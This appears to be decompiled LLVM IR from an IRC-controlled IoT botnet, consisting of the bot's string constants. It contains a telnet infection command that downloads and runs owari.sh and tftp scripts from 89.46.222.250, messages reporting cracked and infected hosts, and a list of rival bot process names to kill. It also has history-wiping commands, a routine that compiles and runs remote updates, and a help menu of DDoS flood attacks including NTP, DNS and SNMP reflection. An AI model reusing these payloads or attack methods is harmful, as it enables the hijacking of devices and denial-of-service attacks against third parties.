@global_var_8070d40.279 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806958d.260, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8069594.261, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_806959a.262, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80695a3.263, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8069609.276, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806960e.277, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80695b7.266, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8068309.278, i32 0, i32 0), i8* bitcast ([10 x i8*]* @global_var_80695f6.254 to i8*), i8* bitcast (i32* @global_var_80695f8.255 to i8*)]
@global_var_807f34c.280 = local_unnamed_addr global i32 0
@global_var_806b178.281 = constant [44 x i8] c"PRIVMSG %s :[TELNET] CRACKED - %s:23 %s:%s\0A\00"
@global_var_8069615.282 = constant [3 x i8] c"sh\00"
@global_var_8069618.283 = constant [8 x i8] c"/bin/sh\00"
@global_var_8069620.284 = constant [5 x i8] c"dash\00"
@global_var_8070d6c.285 = global [4 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80695fc.257, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8069615.282, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8069618.283, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8069620.284, i32 0, i32 0)]
@global_var_806b1a4.286 = constant [5 x i8] c"%s\0D\0A\00"
@global_var_80695c3.287 = constant [6 x i8] c"/tmp/\00"
@global_var_80695c9.288 = constant [6 x i8] c"/var/\00"
@global_var_80695cf.289 = constant [10 x i8] c"/var/run/\00"
@global_var_80695d9.290 = constant [10 x i8] c"/dev/shm/\00"
@global_var_80695e3.291 = constant [6 x i8] c"/mnt/\00"
@global_var_80695e9.292 = constant [7 x i8] c"/boot/\00"
@global_var_80695f0.293 = constant [6 x i8] c"/usr/\00"
@global_var_8070d00.294 = global [7 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80695c3.287, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80695c9.288, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80695cf.289, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80695d9.290, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80695e3.291, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80695e9.292, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80695f0.293, i32 0, i32 0)]
@global_var_806b1ac.295 = constant [65 x i8] c">%s.t && cd %s && for a in `ls -a %s`; do >$a; done; >retrieve\0D\0A\00"
@global_var_806b1ed.296 = constant [29 x i8] c">%s.t && cd %s ; >retrieve\0D\0A\00"
@global_var_8067fe4.297 = constant [352 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://89.46.222.250/owari.sh || curl -O http://89.46.222.250/owari.sh; chmod 777 owari.sh; sh owari.sh; busybox tftp 89.46.222.250 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; busybox tftp -r tftp2.sh -g 89.46.222.250; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf owari.sh tftp1.sh tftp2.sh\00"
@global_var_8070698.298 = local_unnamed_addr global [352 x i8]* @global_var_8067fe4.297
@global_var_806b20c.299 = constant [45 x i8] c"PRIVMSG %s :[TELNET] INFECTED - %s:23 %s:%s\0A\00"
@global_var_806b23c.300 = constant [53 x i8] c"PRIVMSG %s :[TELNET] FAILED TO INFECT - %s:23 %s:%s\0A\00"
@global_var_80756c0.301 = local_unnamed_addr global i32 0
@global_var_806b298.302 = constant [29 x i8] c"NOTICE %s :SCANNER <ON/OFF>\0A\00"
@global_var_806b2b5.303 = constant [3 x i8] c"ON\00"
@global_var_806b2b8.304 = constant [3 x i8] c"on\00"
@global_var_806b2bc.305 = constant [43 x i8] c"PRIVMSG %s :[TELNET] [+] SCANNER STARTED!\0A\00"
@global_var_806b2e8.306 = constant [51 x i8] c"PRIVMSG %s :[TELNET] [-] FAILED TO START SCANNER!\0A\00"
@global_var_806b31c.307 = constant [51 x i8] c"PRIVMSG %s :[TELNET] [+] SCANNER ALREADY STARTED!\0A\00"
@global_var_806b34f.308 = constant [4 x i8] c"OFF\00"
@global_var_806b353.309 = constant [4 x i8] c"off\00"
@global_var_806b358.310 = constant [42 x i8] c"PRIVMSG %s :[TELNET] [+] SCANNER KILLED!\0A\00"
@global_var_806b384.311 = constant [50 x i8] c"PRIVMSG %s :[TELNET] [-] FAILED TO KILL SCANNER!\0A\00"
@global_var_806b3b8.312 = constant [47 x i8] c"PRIVMSG %s :[TELNET] [+] SCANNER NOT STARTED!\0A\00"
@global_var_8068144.313 = constant [8 x i8] c"mirai.*\00"
@global_var_806814c.314 = constant [10 x i8] c"dlr.*mips\00"
@global_var_8068156.315 = constant [7 x i8] c"mips64\00"
@global_var_806815d.316 = constant [7 x i8] c"mipsel\00"
@global_var_8068164.317 = constant [6 x i8] c"sh2eb\00"
@global_var_806816a.318 = constant [7 x i8] c"sh2elf\00"
@global_var_8068171.319 = constant [4 x i8] c"sh4\00"
@global_var_8068175.320 = constant [4 x i8] c"x86\00"
@global_var_8068179.321 = constant [4 x i8] c"arm\00"
@global_var_806817d.322 = constant [6 x i8] c"armv5\00"
@global_var_8068183.323 = constant [8 x i8] c"armv4tl\00"
@global_var_806818b.324 = constant [6 x i8] c"armv4\00"
@global_var_8068191.325 = constant [6 x i8] c"armv6\00"
@global_var_8068197.326 = constant [5 x i8] c"i686\00"
@global_var_806819c.327 = constant [8 x i8] c"powerpc\00"
@global_var_80681a4.328 = constant [13 x i8] c"powerpc440fp\00"
@global_var_80681b1.329 = constant [5 x i8] c"i586\00"
@global_var_80681b6.330 = constant [5 x i8] c"m68k\00"
@global_var_80681bb.331 = constant [6 x i8] c"sparc\00"
@global_var_80681c1.332 = constant [7 x i8] c"x86_64\00"
@global_var_80681c8.333 = constant [8 x i8] c"jackmy*\00"
@global_var_80681d0.334 = constant [8 x i8] c"hackmy*\00"
@global_var_80681d8.335 = constant [3 x i8] c"b1\00"
@global_var_80681db.336 = constant [3 x i8] c"b2\00"
@global_var_80681de.337 = constant [3 x i8] c"b3\00"
@global_var_80681e1.338 = constant [3 x i8] c"b4\00"
@global_var_80681e4.339 = constant [3 x i8] c"b5\00"
@global_var_80681e7.340 = constant [3 x i8] c"b6\00"
@global_var_80681ea.341 = constant [3 x i8] c"b7\00"
@global_var_80681ed.342 = constant [3 x i8] c"b8\00"
@global_var_80681f0.343 = constant [3 x i8] c"b9\00"
@global_var_80681f3.344 = constant [4 x i8] c"b10\00"
@global_var_80681f7.345 = constant [4 x i8] c"b11\00"
@global_var_80681fb.346 = constant [4 x i8] c"b12\00"
@global_var_80681ff.347 = constant [4 x i8] c"b13\00"
@global_var_8068203.348 = constant [4 x i8] c"b14\00"
@global_var_8068207.349 = constant [4 x i8] c"b15\00"
@global_var_806820b.350 = constant [4 x i8] c"b16\00"
@global_var_806820f.351 = constant [4 x i8] c"b17\00"
@global_var_8068213.352 = constant [4 x i8] c"b18\00"
@global_var_8068217.353 = constant [4 x i8] c"b19\00"
@global_var_806821b.354 = constant [4 x i8] c"b20\00"
@global_var_806821f.355 = constant [17 x i8] c"busyboxterrorist\00"
@global_var_8068230.356 = constant [10 x i8] c"dvrHelper\00"
@global_var_806823a.357 = constant [5 x i8] c"kmy*\00"
@global_var_806823f.358 = constant [5 x i8] c"lol*\00"
@global_var_8068244.359 = constant [8 x i8] c"telmips\00"
@global_var_806824c.360 = constant [10 x i8] c"telmips64\00"
@global_var_8068256.361 = constant [10 x i8] c"telmipsel\00"
@global_var_8068260.362 = constant [9 x i8] c"telsh2eb\00"
@global_var_8068269.363 = constant [10 x i8] c"telsh2elf\00"
@global_var_8068273.364 = constant [7 x i8] c"telsh4\00"
@global_var_806827a.365 = constant [7 x i8] c"telx86\00"
@global_var_8068281.366 = constant [9 x i8] c"telarmv5\00"
@global_var_806828a.367 = constant [11 x i8] c"telarmv4tl\00"
@global_var_8068295.368 = constant [9 x i8] c"telarmv4\00"
@global_var_806829e.369 = constant [9 x i8] c"telarmv6\00"
@global_var_80682a7.370 = constant [8 x i8] c"teli686\00"
@global_var_80682af.371 = constant [11 x i8] c"telpowerpc\00"
@global_var_80682ba.372 = constant [16 x i8] c"telpowerpc440fp\00"
@global_var_80682ca.373 = constant [8 x i8] c"teli586\00"
@global_var_80682d2.374 = constant [8 x i8] c"telm68k\00"
@global_var_80682da.375 = constant [9 x i8] c"telsparc\00"
@global_var_80682e3.376 = constant [10 x i8] c"telx86_64\00"
@global_var_80682ed.377 = constant [9 x i8] c"TwoFace*\00"
@global_var_80682f6.378 = constant [5 x i8] c"xxb*\00"
@global_var_80682fb.379 = constant [3 x i8] c"bb\00"
@global_var_80682fe.380 = constant [11 x i8] c"busybotnet\00"
@global_var_8068311.381 = constant [7 x i8] c"badbox\00"
@global_var_8068318.382 = constant [3 x i8] c"B1\00"
@global_var_806831b.383 = constant [3 x i8] c"B2\00"
@global_var_806831e.384 = constant [3 x i8] c"B3\00"
@global_var_8068321.385 = constant [3 x i8] c"B4\00"
@global_var_8068324.386 = constant [3 x i8] c"B5\00"
@global_var_8068327.387 = constant [3 x i8] c"B6\00"
@global_var_806832a.388 = constant [3 x i8] c"B7\00"
@global_var_806832d.389 = constant [3 x i8] c"B8\00"
@global_var_8068330.390 = constant [3 x i8] c"B9\00"
@global_var_8068333.391 = constant [4 x i8] c"B10\00"
@global_var_8068337.392 = constant [4 x i8] c"B11\00"
@global_var_806833b.393 = constant [4 x i8] c"B12\00"
@global_var_806833f.394 = constant [4 x i8] c"B13\00"
@global_var_8068343.395 = constant [4 x i8] c"B14\00"
@global_var_8068347.396 = constant [4 x i8] c"B15\00"
@global_var_806834b.397 = constant [4 x i8] c"B16\00"
@global_var_806834f.398 = constant [4 x i8] c"B17\00"
@global_var_8068353.399 = constant [4 x i8] c"B18\00"
@global_var_8068357.400 = constant [4 x i8] c"B20\00"
@global_var_806835b.401 = constant [7 x i8] c"gaybot\00"
@global_var_8068362.402 = constant [6 x i8] c"hackz\00"
@global_var_8068368.403 = constant [5 x i8] c"bin*\00"
@global_var_806836d.404 = constant [5 x i8] c"gtop\00"
@global_var_8068372.405 = constant [7 x i8] c"botnet\00"
@global_var_8068379.406 = constant [8 x i8] c"swatnet\00"
@global_var_8068381.407 = constant [8 x i8] c"ballpit\00"
@global_var_8068389.408 = constant [8 x i8] c"fucknet\00"
@global_var_8068391.409 = constant [9 x i8] c"cracknet\00"
@global_var_806839a.410 = constant [8 x i8] c"weednet\00"
@global_var_80683a2.411 = constant [7 x i8] c"gaynet\00"
@global_var_80683a9.412 = constant [9 x i8] c"queernet\00"
@global_var_80683b2.413 = constant [8 x i8] c"ballnet\00"
@global_var_80683ba.414 = constant [5 x i8] c"unet\00"
@global_var_80683bf.415 = constant [7 x i8] c"yougay\00"
@global_var_80683c6.416 = constant [7 x i8] c"sttftp\00"
@global_var_80683cd.417 = constant [7 x i8] c"sstftp\00"
@global_var_80683d4.418 = constant [7 x i8] c"sbtftp\00"
@global_var_80683db.419 = constant [6 x i8] c"btftp\00"
@global_var_80683e1.420 = constant [9 x i8] c"y0u1sg3y\00"
@global_var_80683ea.421 = constant [6 x i8] c"bruv*\00"
@global_var_80683f0.422 = constant [5 x i8] c"IoT*\00"
@global_var_80683f5.423 = constant [6 x i8] c"kawi*\00"
@global_var_80683fb.424 = constant [6 x i8] c"kiwi*\00"
@global_var_8068401.425 = constant [8 x i8] c"botgod*\00"
@global_var_80706a0.426 = global [114 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8068144.313, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_806814c.314, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8068156.315, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806815d.316, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8068164.317, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806816a.318, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8068171.319, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8068175.320, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8068179.321, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_806817d.322, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8068183.323, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_806818b.324, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8068191.325, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8068197.326, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_806819c.327, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_80681a4.328, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80681b1.329, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80681b6.330, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80681bb.331, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80681c1.332, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80681c8.333, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80681d0.334, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80681d8.335, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80681db.336, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80681de.337, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80681e1.338, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80681e4.339, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80681e7.340, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80681ea.341, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80681ed.342, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80681f0.343, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80681f3.344, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80681f7.345, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80681fb.346, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80681ff.347, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8068203.348, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8068207.349, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806820b.350, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806820f.351, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8068213.352, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8068217.353, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806821b.354, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_806821f.355, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8068230.356, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_806823a.357, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_806823f.358, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8068244.359, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_806824c.360, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8068256.361, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8068260.362, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8068269.363, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8068273.364, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806827a.365, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8068281.366, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_806828a.367, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8068295.368, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_806829e.369, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80682a7.370, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_80682af.371, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_80682ba.372, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80682ca.373, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80682d2.374, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80682da.375, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80682e3.376, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80682ed.377, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80682f6.378, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80682fb.379, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_80682fe.380, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8068309.278, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8068311.381, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8068318.382, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_806831b.383, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_806831e.384, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8068321.385, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8068324.386, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8068327.387, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_806832a.388, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_806832d.389, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8068330.390, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8068333.391, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8068337.392, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806833b.393, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806833f.394, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8068343.395, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8068347.396, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806834b.397, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_806834f.398, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8068353.399, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8068357.400, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_806835b.401, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8068362.402, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8068368.403, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_806836d.404, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8068372.405, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8068379.406, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8068381.407, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8068389.408, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8068391.409, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_806839a.410, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80683a2.411, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80683a9.412, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80683b2.413, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80683ba.414, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80683bf.415, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80683c6.416, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80683cd.417, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80683d4.418, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80683db.419, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80683e1.420, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80683ea.421, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80683f0.422, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80683f5.423, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80683fb.424, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8068401.425, i32 0, i32 0)]
@global_var_806b3e8.427 = constant [123 x i8] c"pkill -9 %s || busybox pkill -9 %s || /usr/busybox pkill -9 %s || /bin/busybox pkill -9 %s || /var/run/busybox pkill -9 %s\00"
@global_var_806b463.428 = constant [22 x i8] c"history -c;history -w\00"
@global_var_806b479.429 = constant [29 x i8] c"cd /root;rm -f .bash_history\00"
@global_var_806b496.430 = constant [21 x i8] c"cd /var/tmp; rm -f *\00"
@global_var_806b4ab.431 = constant [30 x i8] c"NOTICE %s :%s resolves to %s\0A\00"
@global_var_806b4c9.432 = constant [28 x i8] c"NOTICE %s :DNS2IP <domain>\0A\00"
@global_var_806b4e8.433 = constant [40 x i8] c"NOTICE %s :UPDATEHTTP <host> <src:bin>\0A\00"
@global_var_806b510.434 = constant [96 x i8] c"NOTICE %s :Unable to create socket (Wierd, you shouldnt get this error and ITS NOT MY FAULT!).\0A\00"
@global_var_806b570.435 = constant [11 x i8] c"gcc --help\00"
@global_var_806b57b.436 = constant [6 x i8] c"Usage\00"
@global_var_806b581.437 = constant [30 x i8] c"NOTICE %s :Receiving update.\0A\00"
@global_var_806b59f.438 = constant [11 x i8] c"mkdir /tmp\00"
@global_var_806b5aa.439 = constant [8 x i8] c"/tmp/.c\00"
@global_var_806b5b4.441 = constant [70 x i8] c"(gcc -o %s /tmp/.c; rm -f /tmp/.c; kill -9 %d; %s &) > /dev/null 2>&1\00"
@global_var_806b5fa.442 = constant [8 x i8] c"/tmp/.o\00"
@global_var_806b604.443 = constant [188 x i8] c"export PATH=/usr/sbin:/bin:/usr/bin:/sbin:/var/bin;chmod +x /tmp/.o; trap '' 1;sh -c '/var/bin/killall knight*;/var/bin/killall kt*;/var/bin/killall .o;/var/bin/sleep 5;trap  1;/tmp/.o '&\00"
@global_var_806b6c0.444 = constant [26 x i8] c"NOTICE %s :MOVE <server>\0A\00"
@global_var_807e2e4.445 = local_unnamed_addr global i32 0
@global_var_80756c4.446 = local_unnamed_addr global i32 0
@global_var_806b6da.447 = constant [9 x i8] c"/var/bin\00"
@global_var_806b6e4.448 = constant [40 x i8] c"NOTICE %s :HACKPGK <url> <binary name>\0A\00"
@global_var_806b70c.449 = constant [277 x i8] c"GET /%s HTTP/1.1\0D\0AConnection: Keep-Alive\0D\0AUser-Agent: HackZilla/1.67 [en] (X11; U; Linux 2.2.16-3 x64)\0D\0AHost: %s:80\0D\0AAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\0D\0AAccept-Encoding: gzip\0D\0AAccept-Language: en\0D\0AAccept-Charset: iso-8859-1,*,utf-8\0D\0A\0D\0A\00"
@global_var_806b824.450 = constant [39 x i8] c"NOTICE %s :Installed %s to hack path.\0A\00"
@global_var_806b84b.451 = constant [21 x i8] c"cat %s > /var/bin/%s\00"
@global_var_806b860.452 = constant [9 x i8] c"rm -f %s\00"
@global_var_806b869.453 = constant [22 x i8] c"chmod 775 /var/bin/%s\00"
@global_var_806b87f.454 = constant [18 x i8] c"ls -l /var/bin/%s\00"
@global_var_806b894.455 = constant [55 x i8] c"NOTICE %s :Non-root/non-spoof DDoS commands commands:\0A\00"
@global_var_806b8cc.456 = constant [69 x i8] c"NOTICE %s :    STD <host> <port> <time> = A non spoofed STD flooder\0A\00"
@global_var_806b914.457 = constant [84 x i8] c"NOTICE %s :    OVH <host> <port> <throttle> <time> = A non spoofed UDP OVH flooder\0A\00"
@global_var_806b968.458 = constant [84 x i8] c"NOTICE %s :    vTCP <ip> <port> <time> = A non spoofed Randomizer TCP flooder Flag\0A\00"
@global_var_806b9bc.459 = constant [74 x i8] c"NOTICE %s :    HOLD <host> <port> <time> = A vanilla TCP connect flooder\0A\00"
@global_var_806ba08.460 = constant [75 x i8] c"NOTICE %s :    JUNK <host> <port> <time> = A vanilla TCP flooder (modded)\0A\00"
@global_var_806ba54.461 = constant [143 x i8] c"NOTICE %s :    UNKNOWN <target> <port, 0 for random> <packet size, 0 for random> <secs> = An advanced non spoof UDP flooder modified by Freak\0A\00"
@global_var_806bae4.462 = constant [105 x i8] c"NOTICE %s :    HTTP <method> <target> <port> <path> <time> <power> = An extremely powerful HTTP flooder\0A\00"
@global_var_806bb50.463 = constant [60 x i8] c"NOTICE %s :    WGETFLOOD <url> <secs> = An HTTP(S) flooder\0A\00"
@global_var_806bb8c.464 = constant [33 x i8] c"NOTICE %s :Spoof/root commands:\0A\00"
@global_var_806bbb0.465 = constant [59 x i8] c"NOTICE %s :    UDP <target> <port> <secs> = A UDP flooder\0A\00"
@global_var_806bbec.466 = constant [124 x i8] c"NOTICE %s :    VSET <method> <target> <thread> <time> = Valve Source Engine Flood, using the TQuery Engine Source EXPLOIT.\0A\00"
@global_var_806bc68.467 = constant [105 x i8] c"NOTICE %s :    PAN <target> <port> <secs> = An advanced syn flooder that will kill most network drivers\0A\00"
@global_var_806bcd4.468 = constant [166 x i8] c"NOTICE %s :    TCP <target> <port> <time> <flags> <packetsize> <pollinterval> <threads> = An advanced TCP flooder with multithreading. Will kill almost any service.\0A\00"
@global_var_806bd7c.469 = constant [95 x i8] c"NOTICE %s :    GIGATCP Flooding <target> <flags/method> <secs> = Advanced Spoofed TCP Flooder\0A\00"
@global_var_806bddc.470 = constant [141 x i8] c"NOTICE %s :    BLACKNURSE <target ip> <secs> = An ICMP packet flooder that will crash most firewalls and use loads of CPU. USE EXTREME CARE\0A\00"
@global_var_806be6c.471 = constant [85 x i8] c"NOTICE %s :    SOCKSTRESS <ip>:<port> <interface> -s <time> [-p payload] [-d delay]\0A\00"
@global_var_806bec4.472 = constant [152 x i8] c"NOTICE %s :    NTP <target IP> <target port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time> = A NTP DrDoS flooder. Very potent.\0A\00"
@global_var_806bf5c.473 = constant [114 x i8] c"NOTICE %s :    DNS <IP> <port> <reflection file url> <threads> <time> = A DNS DrDoS flooder. Almost unblockable.\0A\00"
@global_var_806bfd0.474 = constant [159 x i8] c"NOTICE %s :    SNMP <IP> <port> <reflection file url> <threads> <pps limiter, -1 for no limit> <time> =   SNMP DrDoS flooder. Insane amp factor (600 - 1700x)\0A\00"
@global_var_806c06f.475 = constant [28 x i8] c"NOTICE %s :Other commands:\0A\00"
@global_var_806c08c.476 = constant [54 x i8] c"NOTICE %s :    RNDNICK = Randomizes the knights nick\0A\00"
